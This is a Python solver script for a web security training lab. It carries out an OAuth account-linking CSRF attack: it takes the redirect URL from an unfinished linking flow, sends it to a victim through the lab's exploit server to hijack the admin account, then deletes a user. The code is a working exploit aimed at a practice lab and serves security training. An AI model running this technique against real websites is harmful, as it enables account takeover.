from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin
from requests import Request
from bs4 import BeautifulSoup


def solve_lab(session):
    # Begin OAuth flow
    session.login("wiener", "peter")
    resp = session.get_path("/my-account?id=wiener")
    soup = BeautifulSoup(resp.text, "lxml")
    oauth_linking = soup.select_one("p a").get("href")
    social_url = urljoin(oauth_linking, "/")
    logger.info(
        "Initiating (but not completing) OAuth flow for linking social media profile..."
    )

    # Log in
    resp = session.get(oauth_linking)
    soup = BeautifulSoup(resp.text, "lxml")
    login_path = soup.select_one("form.login-form").get("action")
    data = {"username": "peter.wiener", "password": "hotdog"}
    resp = session.post(urljoin(social_url, login_path), data=data)
    logger.info('Logged into social media as "peter.wiener"')

    # Allow lab access to profile + email, but don't complete OAuth flow
    soup = BeautifulSoup(resp.text, "lxml")
    oauth_path = soup.select_one("form").get("action")
    resp = session.post(urljoin(social_url, oauth_path), allow_redirects=False)
    logger.info("Allowed lab access to profile + email")

    # Extract URL that completes OAuth flow
    resp = session.get(resp.headers["Location"], allow_redirects=False)
    soup = BeautifulSoup(resp.text, "lxml")
    redirect_url = soup.select_one("a").get("href")
    logger.info(f"Redirect URL: {redirect_url}")

    # Perform CSRF that attaches social media profile to the admin's account
    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(Request("GET", redirect_url))
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    # Log out of lab account, log in using social media account
    session.get_path("/logout")
    resp = session.get_path("/login")
    soup = BeautifulSoup(resp.text, "lxml")
    oauth_login = soup.select_one("form a").get("href")
    session.get(oauth_login)
    logger.info("Logged into lab using social media")

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
